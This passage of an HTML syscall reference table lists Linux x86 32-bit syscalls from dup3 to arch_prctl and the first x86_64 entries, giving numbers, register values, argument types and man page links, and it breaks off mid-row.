align="center"><a href="https://man7.org/linux/man-pages/man2/dup3.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*dup3">cs/</a></td><td align="center">0x14a</td><td>unsigned int oldfd</td><td>unsigned int newfd</td><td>int flags</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">331</td><td>pipe2</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/pipe2.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pipe2">cs/</a></td><td align="center">0x14b</td><td>int *fildes</td><td>int flags</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">332</td><td>inotify_init1</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/inotify_init1.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*inotify_init1">cs/</a></td><td align="center">0x14c</td><td>int flags</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">333</td><td>preadv</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/preadv.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*preadv">cs/</a></td><td align="center">0x14d</td><td>unsigned long fd</td><td>const struct iovec *vec</td><td>unsigned long vlen</td><td>unsigned long pos_l</td><td>unsigned long pos_h</td><td>-</td></tr><tr><td align="center">334</td><td>pwritev</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/pwritev.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pwritev">cs/</a></td><td align="center">0x14e</td><td>unsigned long fd</td><td>const struct iovec *vec</td><td>unsigned long vlen</td><td>unsigned long pos_l</td><td>unsigned long pos_h</td><td>-</td></tr><tr><td align="center">335</td><td>rt_tgsigqueueinfo</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/rt_tgsigqueueinfo.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*rt_tgsigqueueinfo">cs/</a></td><td align="center">0x14f</td><td>pid_t tgid</td><td>pid_t pid</td><td>int sig</td><td>siginfo_t *uinfo</td><td>-</td><td>-</td></tr><tr><td align="center">336</td><td>perf_event_open</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/perf_event_open.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*perf_event_open">cs/</a></td><td align="center">0x150</td><td>struct perf_event_attr *attr_uptr</td><td>pid_t pid</td><td>int cpu</td><td>int group_fd</td><td>unsigned long flags</td><td>-</td></tr><tr><td align="center">337</td><td>recvmmsg</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/recvmmsg.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*recvmmsg">cs/</a></td><td align="center">0x151</td><td>int fd</td><td>struct mmsghdr *msg</td><td>unsigned int vlen</td><td>unsigned flags</td><td>struct __kernel_timespec *timeout</td><td>-</td></tr><tr><td align="center">338</td><td>fanotify_init</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fanotify_init.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fanotify_init">cs/</a></td><td align="center">0x152</td><td>unsigned int flags</td><td>unsigned int event_f_flags</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">339</td><td>fanotify_mark</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fanotify_mark.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fanotify_mark">cs/</a></td><td align="center">0x153</td><td>int fanotify_fd</td><td>unsigned int flags</td><td>u64 mask</td><td>int fd</td><td>const char *pathname</td><td>-</td></tr><tr><td align="center">340</td><td>prlimit64</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/prlimit64.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*prlimit64">cs/</a></td><td align="center">0x154</td><td>pid_t pid</td><td>unsigned int resource</td><td>const struct rlimit64 *new_rlim</td><td>struct rlimit64 *old_rlim</td><td>-</td><td>-</td></tr><tr><td align="center">341</td><td>name_to_handle_at</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/name_to_handle_at.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*name_to_handle_at">cs/</a></td><td align="center">0x155</td><td>int dfd</td><td>const char *name</td><td>struct file_handle *handle</td><td>int *mnt_id</td><td>int flag</td><td>-</td></tr><tr><td align="center">342</td><td>open_by_handle_at</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/open_by_handle_at.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*open_by_handle_at">cs/</a></td><td align="center">0x156</td><td>int mountdirfd</td><td>struct file_handle *handle</td><td>int flags</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">343</td><td>clock_adjtime</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/clock_adjtime.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*clock_adjtime">cs/</a></td><td align="center">0x157</td><td>clockid_t which_clock</td><td>struct __kernel_timex *tx</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">344</td><td>syncfs</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/syncfs.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*syncfs">cs/</a></td><td align="center">0x158</td><td>int fd</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">345</td><td>sendmmsg</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sendmmsg.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sendmmsg">cs/</a></td><td align="center">0x159</td><td>int fd</td><td>struct mmsghdr *msg</td><td>unsigned int vlen</td><td>unsigned flags</td><td>-</td><td>-</td></tr><tr><td align="center">346</td><td>setns</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setns.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setns">cs/</a></td><td align="center">0x15a</td><td>int fd</td><td>int nstype</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">347</td><td>process_vm_readv</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/process_vm_readv.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*process_vm_readv">cs/</a></td><td align="center">0x15b</td><td>pid_t pid</td><td>const struct iovec *lvec</td><td>unsigned long liovcnt</td><td>const struct iovec *rvec</td><td>unsigned long riovcnt</td><td>unsigned long flags</td></tr><tr><td align="center">348</td><td>process_vm_writev</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/process_vm_writev.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*process_vm_writev">cs/</a></td><td align="center">0x15c</td><td>pid_t pid</td><td>const struct iovec *lvec</td><td>unsigned long liovcnt</td><td>const struct iovec *rvec</td><td>unsigned long riovcnt</td><td>unsigned long flags</td></tr><tr><td align="center">349</td><td>kcmp</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/kcmp.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*kcmp">cs/</a></td><td align="center">0x15d</td><td>pid_t pid1</td><td>pid_t pid2</td><td>int type</td><td>unsigned long idx1</td><td>unsigned long idx2</td><td>-</td></tr><tr><td align="center">350</td><td>finit_module</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/finit_module.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*finit_module">cs/</a></td><td align="center">0x15e</td><td>int fd</td><td>const char *uargs</td><td>int flags</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">351</td><td>sched_setattr</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sched_setattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sched_setattr">cs/</a></td><td align="center">0x15f</td><td>pid_t pid</td><td>struct sched_attr *attr</td><td>unsigned int flags</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">352</td><td>sched_getattr</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sched_getattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sched_getattr">cs/</a></td><td align="center">0x160</td><td>pid_t pid</td><td>struct sched_attr *attr</td><td>unsigned int size</td><td>unsigned int flags</td><td>-</td><td>-</td></tr><tr><td align="center">353</td><td>renameat2</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/renameat2.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*renameat2">cs/</a></td><td align="center">0x161</td><td>int olddfd</td><td>const char *oldname</td><td>int newdfd</td><td>const char *newname</td><td>unsigned int flags</td><td>-</td></tr><tr><td align="center">354</td><td>seccomp</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/seccomp.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*seccomp">cs/</a></td><td align="center">0x162</td><td>unsigned int op</td><td>unsigned int flags</td><td>void *uargs</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">355</td><td>getrandom</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getrandom.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getrandom">cs/</a></td><td align="center">0x163</td><td>char *buf</td><td>size_t count</td><td>unsigned int flags</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">356</td><td>memfd_create</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/memfd_create.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*memfd_create">cs/</a></td><td align="center">0x164</td><td>const char *uname_ptr</td><td>unsigned int flags</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">357</td><td>bpf</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/bpf.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*bpf">cs/</a></td><td align="center">0x165</td><td>int cmd</td><td>union bpf_attr *attr</td><td>unsigned int size</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">358</td><td>execveat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/execveat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*execveat">cs/</a></td><td align="center">0x166</td><td>int dfd</td><td>const char *filename</td><td>const char *const *argv</td><td>const char *const *envp</td><td>int flags</td><td>-</td></tr><tr><td align="center">359</td><td>socket</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/socket.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*socket">cs/</a></td><td align="center">0x167</td><td>int</td><td>int</td><td>int</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">360</td><td>socketpair</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/socketpair.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*socketpair">cs/</a></td><td align="center">0x168</td><td>int</td><td>int</td><td>int</td><td>int *</td><td>-</td><td>-</td></tr><tr><td align="center">361</td><td>bind</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/bind.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*bind">cs/</a></td><td align="center">0x169</td><td>int</td><td>struct sockaddr *</td><td>int</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">362</td><td>connect</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/connect.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*connect">cs/</a></td><td align="center">0x16a</td><td>int</td><td>struct sockaddr *</td><td>int</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">363</td><td>listen</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/listen.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*listen">cs/</a></td><td align="center">0x16b</td><td>int</td><td>int</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">364</td><td>accept4</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/accept4.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*accept4">cs/</a></td><td align="center">0x16c</td><td>int</td><td>struct sockaddr *</td><td>int *</td><td>int</td><td>-</td><td>-</td></tr><tr><td align="center">365</td><td>getsockopt</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getsockopt.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getsockopt">cs/</a></td><td align="center">0x16d</td><td>int fd</td><td>int level</td><td>int optname</td><td>char *optval</td><td>int *optlen</td><td>-</td></tr><tr><td align="center">366</td><td>setsockopt</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setsockopt.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setsockopt">cs/</a></td><td align="center">0x16e</td><td>int fd</td><td>int level</td><td>int optname</td><td>char *optval</td><td>int optlen</td><td>-</td></tr><tr><td align="center">367</td><td>getsockname</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getsockname.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getsockname">cs/</a></td><td align="center">0x16f</td><td>int</td><td>struct sockaddr *</td><td>int *</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">368</td><td>getpeername</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getpeername.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getpeername">cs/</a></td><td align="center">0x170</td><td>int</td><td>struct sockaddr *</td><td>int *</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">369</td><td>sendto</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sendto.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sendto">cs/</a></td><td align="center">0x171</td><td>int</td><td>void *</td><td>size_t</td><td>unsigned</td><td>struct sockaddr *</td><td>int</td></tr><tr><td align="center">370</td><td>sendmsg</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sendmsg.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sendmsg">cs/</a></td><td align="center">0x172</td><td>int fd</td><td>struct user_msghdr *msg</td><td>unsigned flags</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">371</td><td>recvfrom</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/recvfrom.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*recvfrom">cs/</a></td><td align="center">0x173</td><td>int</td><td>void *</td><td>size_t</td><td>unsigned</td><td>struct sockaddr *</td><td>int *</td></tr><tr><td align="center">372</td><td>recvmsg</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/recvmsg.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*recvmsg">cs/</a></td><td align="center">0x174</td><td>int fd</td><td>struct user_msghdr *msg</td><td>unsigned flags</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">373</td><td>shutdown</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/shutdown.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*shutdown">cs/</a></td><td align="center">0x175</td><td>int</td><td>int</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">374</td><td>userfaultfd</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/userfaultfd.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*userfaultfd">cs/</a></td><td align="center">0x176</td><td>int flags</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">375</td><td>membarrier</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/membarrier.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*membarrier">cs/</a></td><td align="center">0x177</td><td>int cmd</td><td>int flags</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">376</td><td>mlock2</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mlock2.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mlock2">cs/</a></td><td align="center">0x178</td><td>unsigned long start</td><td>size_t len</td><td>int flags</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">377</td><td>copy_file_range</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/copy_file_range.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*copy_file_range">cs/</a></td><td align="center">0x179</td><td>int fd_in</td><td>loff_t *off_in</td><td>int fd_out</td><td>loff_t *off_out</td><td>size_t len</td><td>unsigned int flags</td></tr><tr><td align="center">378</td><td>preadv2</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/preadv2.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*preadv2">cs/</a></td><td align="center">0x17a</td><td>unsigned long fd</td><td>const struct iovec *vec</td><td>unsigned long vlen</td><td>unsigned long pos_l</td><td>unsigned long pos_h</td><td>rwf_t flags</td></tr><tr><td align="center">379</td><td>pwritev2</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/pwritev2.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pwritev2">cs/</a></td><td align="center">0x17b</td><td>unsigned long fd</td><td>const struct iovec *vec</td><td>unsigned long vlen</td><td>unsigned long pos_l</td><td>unsigned long pos_h</td><td>rwf_t flags</td></tr><tr><td align="center">380</td><td>pkey_mprotect</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/pkey_mprotect.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pkey_mprotect">cs/</a></td><td align="center">0x17c</td><td>unsigned long start</td><td>size_t len</td><td>unsigned long prot</td><td>int pkey</td><td>-</td><td>-</td></tr><tr><td align="center">381</td><td>pkey_alloc</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/pkey_alloc.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pkey_alloc">cs/</a></td><td align="center">0x17d</td><td>unsigned long flags</td><td>unsigned long init_val</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">382</td><td>pkey_free</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/pkey_free.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pkey_free">cs/</a></td><td align="center">0x17e</td><td>int pkey</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">383</td><td>statx</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/statx.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*statx">cs/</a></td><td align="center">0x17f</td><td>int dfd</td><td>const char *path</td><td>unsigned flags</td><td>unsigned mask</td><td>struct statx *buffer</td><td>-</td></tr><tr><td align="center">384</td><td>arch_prctl</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/arch_prctl.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*arch_prctl">cs/</a></td><td align="center">0x180</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr></tbody></table><h1 id="0x2-x86-64-64bit"><a href="#0x2-x86-64-64bit" class="headerlink" title="0x2 x86_64-64bit"></a>0x2 x86_64-64bit</h1><table><thead><tr><th align="center">NR</th><th>syscall name</th><th align="center">references</th><th align="center">%rax</th><th>arg0 (%rdi)</th><th>arg1 (%rsi)</th><th>arg2 (%rdx)</th><th>arg3 (%r10)</th><th>arg4 (%r8)</th><th>arg5 (%r9)</th></tr></thead><tbody><tr><td align="center">0</td><td>read</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/read.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*read">cs/</a></td><td align="center">0x00</td><td>unsigned int fd</td><td>char *buf</td><td>size_t count</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">1</td><td>write</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/write.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*write">cs/</a></td><td align="center">0x01</td><td>unsigned int fd</td><td>const char *buf</td><td>size_t count</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">2</td><td>open</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/open.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*open">cs/</a></td><td align="center">0x02</td><td>const char *filename</td><td>int flags</td><td>umode_t mode</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">3</td><td>close</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/close.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*close">cs/</a></td><td align="center">0x03</td><td>unsigned int fd</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">4</td><td>stat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/stat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*stat">cs/</a></td><td align="center">0x04</td><td>const char *filename</td><td>struct __old_kernel_stat *statbuf</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">5</td><td>fstat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fstat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fstat">cs/</a></td><td align="center">0x05</td><td>unsigned int fd</td><td>struct __old_kernel_stat *statbuf</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">6</td><td>lstat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/lstat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*lstat">cs/</a></td><td align="center">0x06</td><td>const char *filename</td><td>struct __old_kernel_stat *statbuf</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">7</td><td>poll</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/poll.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*poll">cs/</a></td><td align="center">0x07</td><td>struct pollfd *ufds</td><td>unsigned int nfds</td><td>int timeout</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">8</td><td>lseek</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/lseek.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*lseek">cs/</a></td><td align="center">0x08</td><td>unsigned int fd</td><td>off_t offset</td><td>unsigned int whence</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">9</td><td>mmap</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mmap.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mmap">cs/</a></td><td align="center">0x09</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">10</td><td>mprotect</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mprotect.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mprotect">cs/</a></td><td align="center">0x0a</td><td>unsigned long start</td><td>size_t len</td><td>unsigned long prot</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">11</td><td>munmap</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/munmap.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*munmap">cs/</a></td><td align="center">0x0b</td><td>unsigned long addr</td><td>size_t len</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">12</td><td>brk</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/brk.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*brk">cs/</a></td><td align="center">0x0c</td><td>unsigned long brk</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">13</td><td>rt_sigaction</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/rt_sigaction.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*rt_sigaction">cs/</a></td><td align="center">0x0d</td><td>int</td><td>const struct sigaction *</td><td>struct sigaction *</td><td>size_t</td><td>-</td><td>-</td></tr><tr><td align="center">14</td><td>rt_sigprocmask</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/rt_sigprocmask.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*rt_sigprocmask">cs/</a></td><td align="center">0x0e</td><td>int how</td><td>sigset_t *set</td><td>sigset_t *oset</td><td>size_t sigsetsize</td><td>-</td><td>-</td></tr><tr><td align="center">15</td><td>rt_sigreturn</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/rt_sigreturn.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*rt_sigreturn">cs/</a></td><td align="center">0x0f</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">16</td><td>ioctl</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/ioctl.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*ioctl">cs/</a></td><td align="center">0x10</td><td>unsigned int fd</td><td>unsigned int cmd</td><td>unsigned long arg</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">17</td><td>pread64</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/pread64.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pread64">cs/</a></td><td align="center">0x11</td><td>unsigned int fd</td><td>char *buf</td><td>size_t count</td><td>loff_t pos</td><td>-</td><td>-</td></tr><tr><td align="center">18</td><td>pwrite64</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/pwrite64.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pwrite64">cs/</a></td><td align="center">0x12</td><td>unsigned int fd</td><td>const char *buf</td><td>size_t count</td><td>loff_t pos</td><td>-</td><td>-</td></tr><tr><td align="center">19</td><td>readv</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/readv.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*readv">cs/</a></td><td align="center">0x13</td><td>unsigned long fd</td><td>const struct iovec *vec</td><td>unsigned long vlen</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">20</td><td>writev</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/writev.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*writev">cs/</a></td><td align="center">0x14</td><td>unsigned long fd</td><td>const struct iovec *vec</td><td>unsigned long vlen</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">21</td><td>access</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/access.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*access">cs/</a></td><td align="center">0x15</td><td>const char *filename</td><td>int mode</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">22</td><td>pipe</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/pipe.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pipe">cs/</a></td><td align="center">0x16</td><td>int *fildes</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">23</td><td>select</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/select.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*select">cs/</a></td><td align="center">0x17</td><td>int n</td><td>fd_set *inp</td><td>fd_set *outp</td><td>fd_set *exp</td><td>struct timeval *tvp</td><td>-</td></tr><tr><td align="center">24</td><td>sched_yield</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sched_yield.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sched_yield">cs/</a></td><td align="center">0x18</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">25</td><td>mremap</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mremap.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mremap">cs/</a></td><td 